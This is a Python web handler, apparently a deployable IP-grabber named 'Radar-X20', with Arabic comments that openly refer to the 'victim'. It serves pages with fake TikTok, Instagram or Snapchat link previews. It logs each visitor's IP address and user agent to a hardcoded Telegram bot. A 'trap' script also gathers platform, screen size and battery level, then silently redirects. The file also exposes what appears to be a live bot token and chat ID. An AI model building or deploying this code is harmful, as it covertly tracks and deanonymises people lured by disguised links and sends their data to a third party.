from http.server import BaseHTTPRequestHandler
import json
import urllib.request
import urllib.parse

# 🛡️ بيانات البوت الثابتة
TOKEN = "8619490492:AAEfXC0wN0Uh73BA9TniEqyQh_gb_GyfzUg"
ID = "5811700860"

class Storage:
    target_url = "https://vt.tiktok.com/"

storage = Storage()

class handler(BaseHTTPRequestHandler):
    def do_POST(self):
        try:
            content_length = int(self.headers['Content-Length'])
            data = json.loads(self.rfile.read(content_length))
            storage.target_url = data.get("url", "https://vt.tiktok.com/")
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({"status": "success"}).encode())
        except:
            self.send_response(500)
            self.end_headers()

    def do_GET(self):
        # 1. سحب بيانات الضحية الأساسية من الـ Header
        ip = self.headers.get('x-forwarded-for', self.client_address[0]).split(',')[0]
        ua = self.headers.get('User-Agent', 'Unknown')
        
        # 2. تحديد نوع التمويه بناءً على الرابط المستهدف
        target = storage.target_url.lower()
        title, image = "TikTok Video", "https://sf16-scmcdn-sg.ibytedtos.com/obj/eden-sg/uufs_om_lp/ljhwZ_lp/2021/tiktok_og_image.png"
        
        if "instagram" in target:
            title, image = "Instagram Post", "https://www.instagram.com/static/images/ico/favicon-192.png/ed973502857e.png"
        elif "snapchat" in target:
            title, image = "Snapchat Story", "https://www.snapchat.com/favicon.png"

        # 3. إرسال تنبيه "الدخول الأولي" للتليجرام
        try:
            msg = f"🛰️ **Radar-X20: دخول جديد!**\n\n🌐 IP: `{ip}`\n📱 الجهاز: `{ua}`\n🔗 الرابط: {storage.target_url}"
            api_url = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={ID}&text={urllib.parse.quote(msg)}&parse_mode=Markdown"
            urllib.request.urlopen(urllib.request.Request(api_url, headers={'User-Agent': 'Mozilla/5.0'}))
        except: pass

        # 4. الرد بصفحة الـ HTML الملغمة (تسحب البيانات المتقدمة وتحول فوراً)
        self.send_response(200)
        self.send_header('Content-type', 'text/html; charset=utf-8')
        self.end_headers()

        html = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="UTF-8">
            <title>{title}</title>
            <meta property="og:title" content="{title}">
            <meta property="og:image" content="{image}">
            <meta property="og:description" content="شاهد المحتوى الآن">
            <meta name="twitter:card" content="summary_large_image">
            <script>
                async function trap() {{
                    let deviceData = {{
                        ip: "{ip}",
                        ua: navigator.userAgent,
                        platform: navigator.platform,
                        screen: window.screen.width + "x" + window.screen.height
                    }};
                    
                    // سحب البطارية
                    try {{
                        let b = await navigator.getBattery();
                        deviceData.battery = Math.round(b.level * 100) + "%";
                    }} catch(e) {{ deviceData.battery = "Unknown"; }}

                    // إرسال البيانات النهائية وسرعة التحويل
                    fetch(window.location.href, {{
                        method: 'POST',
                        body: JSON.stringify({{ device: deviceData, action: "سحب بيانات كامل" }}),
                        headers: {{ 'Content-Type': 'application/json' }}
                    }});

                    // تحويل فوري بدون انتظار
                    window.location.replace("{storage.target_url}");
                }}
                window.onload = trap;
            </script>
        </head>
        <body style="background:black;"></body>
        </html>
        """
        self.wfile.write(html.encode())
